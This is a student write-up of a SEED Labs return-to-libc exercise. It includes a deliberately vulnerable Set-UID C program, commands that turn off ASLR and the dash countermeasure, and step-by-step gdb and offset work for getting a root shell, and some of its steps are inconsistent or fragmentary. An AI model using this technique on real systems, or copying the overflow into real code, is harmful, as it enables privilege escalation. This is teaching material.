# Return-to-Libc-seedlab
CS5173-Lab4: Return to Libc attack.

# 1. Description
### 1.1 Return to Libc attack:
A "return-to-libc" attack is a type of computer security exploit that typically begins with a buffer overflow. In this attack, the return address of a function on the call stack is overwritten with the address of an existing subroutine within the executable memory of the process. This approach allows the attacker to bypass the no-execute (NX) protection, if enabled, and eliminates the need to inject any new code into the process.

# 2. Lab
### 2.1 Environment Setup:
**_A. Address Space Randomization:_**

Ubuntu and various other Linux-based systems employ address space randomization to vary the starting addresses of the heap and stack, making it challenging to accurately guess these addresses. Address guessing is a crucial step in buffer overflow attacks. In this lab, we turn off this feature using the following command:  

`sudo sysctl -w kernel.randomize_va_space=0`

**_B. Configuring /bin/sh:_** 

In Ubuntu 20.04, the symbolic link /bin/sh points to the shell /bin/dash, which has a built-in countermeasure to prevent execution within a Set-UID process. When dash runs in a Set-UID context, it immediately reverts the effective user ID to match the real user ID of the process, effectively removing any elevated privileges. Since our target program is a Set-UID program and our attack involves using the system() function to execute a specified command, this function does not execute the command directly but calls /bin/sh to do so. Consequently, the countermeasure in /bin/dash drops Set-UID privileges before running our command, complicating our attack. To bypass this protection, we redirect /bin/sh to a different shell without this restriction. In our Ubuntu 16.04 VM, we installed the zsh shell and can use the following commands to relink /bin/sh to zsh: 

`sudo ln -sf /bin/zsh /bin/sh` 

### 2.2 The Vulnerable Program: *retlib.c*
```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#ifndef BUF_SIZE
#define BUF_SIZE 12
#endif

int bof(char *str)
{
  char buffer[BUF_SIZE];
  unsigned int *framep;
  // Copy ebp into framep
  asm("movl %%ebp, %0" : "=r" (framep));

  /* print out information for experiment purpose */
  printf("Address of buffer[] inside bof(): 0x%.8x\n", (unsigned)buffer);
  printf("Frame Pointer value inside bof(): 0x%.8x\n", (unsigned)framep);

  strcpy(buffer, str);
  return 1;
}
int main(int argc, char **argv)
{
  char input[1000];
  FILE *badfile;

  badfile = fopen("badfile", "r");
  int length = fread(input, sizeof(char), 1000, badfile);
  printf("Address of input[] inside main(): 0x%x\n", (unsigned int) input);
  printf("Input size: %d\n", length);

  bof(input);

  printf("(ˆ_ˆ)(ˆ_ˆ) Returned Properly (ˆ_ˆ)(ˆ_ˆ)\n");
  return 1;
}

// This function will be used in the optional task
void foo(){
    static int i = 1;
    printf("Function foo() is invoked %d times\n", i++);
    return;
}
```
### 2.3 Tasks
**Task 1: Finding out the Addresses of libc Functions** 

- The command `gcc -fno-stack-protector -z noexecstack -o retlib retlib.c` is used to compile the file `retlib.c`. After compiling, we need to set the file’s owner to root with the command `sudo chown root retlib` and then make it executable by running `sudo chmod 4755 retlib`.
- First, we create a file called *badfile*, which can contain any content we choose or even be left empty.
- Next, we start the *gdb* debugger on *retlib* with the command `gdb -q retlib`.
- Once inside *gdb*, we execute the program using the `run` command.
- To obtain the addresses of `system()` and `exit()`, we use the commands `p system` and `p exit`, respectively.

**Task 2: Putting the shell string in the memory** 

- Our attack strategy involves directing execution to the `system()` function to run an arbitrary command.
- Since we want access to a shell prompt, we’ll instruct `system()` to launch the `/bin/sh` program.
- To do this, we need `/bin/sh` to be loaded into memory and must know its memory address so it can be passed to system().
- We define a new variable, `NEW001`, and set it to the string `/bin/sh` using the command export `NEW001=/bin/sh`.

```c
void main(){ 
  char* shell = (char *) getenv("MYSHELL"); 
  if (shell) 
    printf("%x\n", (unsigned int)shell); 
}
```
- After compiling and running this program, we obtain the memory address of `/bin/sh`
  
**Task 3: Launching the Attack** 

- Now we have addresses of `system()`, `exit()` and `/bin/sh`.
- We can place these addresses in the exploit.c program. 
- Now we need to find the value of X, Y and Z
  
**Task 4: Defeat Shell’s countermeasure** 

- We can turn on the address randomization using command `sudo sysctl -w kernel.randomize_va_space=2`
- This time `./retlib` gives segmentation fault. This is because buffer overflow occurred but address of `system()`, `exit()` and `/bin/sh` varied every time. So we can not get a hold on for an exact address. This is why attack was not successful.
- The Values of X, Y and Z do not change, only their addresses change.

### 2.4 Commands List: (Step by step process)
1. Setup environment:  Two Countermeasures.
- Disable the address randomization using `sudo sysctl -w kernel.randomize_va_space=0`
- Link to the z shell instead of Dash using `sudo ln -sf /bin/zsh /bin/sh`

2. Check the makefile. Defining N as 12. 
- `gedit Makefile`
- `make`

3. Check the files using command: `ll`. It will show the newly created retlib file

4. Exploit File:  `gedit exploit.py` -- code to generate baffle. 

5. _TASK1_: find the addresses of system() and exit() first.

- `touch badfile` -- empty baffle.
- `gdb -q retlib` -- Start the debugger

- `break main` -- create a break point at main. 
- `run`
- `p system` -- print the address of system
- `p exit` -- print the address of exit.
- `quit`

6. Place these values in the exploit.py file --- `gedit exploit.py`

7. _TASK2_: Find the address for `/bin/sh`
- This is a string, we have to put it as an argument for our system function call by using environment variable.

8. `export NEW001=/bin/sh` -- create a new environment variable
- `echo $NEW001` -- verify if the new variable is present or not in our environment 

9. `touch prtenv.c` -- creating a file to write c program.
- `gedit prtenv.c` -- writing a c program to print the address of `/bin/sh`
- `gcc -m32 -o prtenv prtenv.c` -- compile the program. 32bit program. Output file name should has exactly same no of characters as its file.
- `ll` -- to check the file 
- `./prtenv` -- compile and run.

- Address for `/bin/sh` has to be put in `exploit.py`
- `gedit exploit.py` - paste the address in `/bin/sh string`.

10. _TASK3_: Find the values of X,Y,Z

- `./retlib` -- we get buffer address, frame pointer ebp address. Get the differences between them using hex cal, which will give us the off set number/size of the buffer when we subtract one from another.

11. `gedit exploit.py` -- insert x,y,z
- The output is 24 which means when we are jumping to the system the ebp value will be increased to 28. => 24 +4. System will be ebp + 4.

- Structure of the file: stack frame:
- `/bin/sh` -- argument of the address -- X = 24 + 12
- `exit()` -- return address -- Z = 24 + 8
- `system()` -- frame pointer address -- Y = 24+4

12. `ll` -- check the badfile bytes. It will be 0

13. Run the exploit file. 
- `./exploit.py`

- Now the file size is 300 bytes. `exploit.py` file generated the badfile

14. Check if it worked.
- `./retlib`

- `Id`, `whoami` to know are we in root shell.

15. _TASK4_: Defeat Shell's Countermeasures.
- `sudo ln -sf /bin/dash /bin/sh` -- from shell to dash.
- `./retlib` -- run the attack and see which user we are in.
- `whoami` -- we will be in different user not the root. Dash shell will drop our privileges. We will be a normal user.
- `Exit`

16. If we use the command: `/bin/bash -p` we will still be the root user with the privileges.

- `int execv(const char *pathname, char *const argv[]);`
- `Touch task4.py`
- `Echo task4.py`

- `./task4.py`
- `./retlib`
- `whoami` 



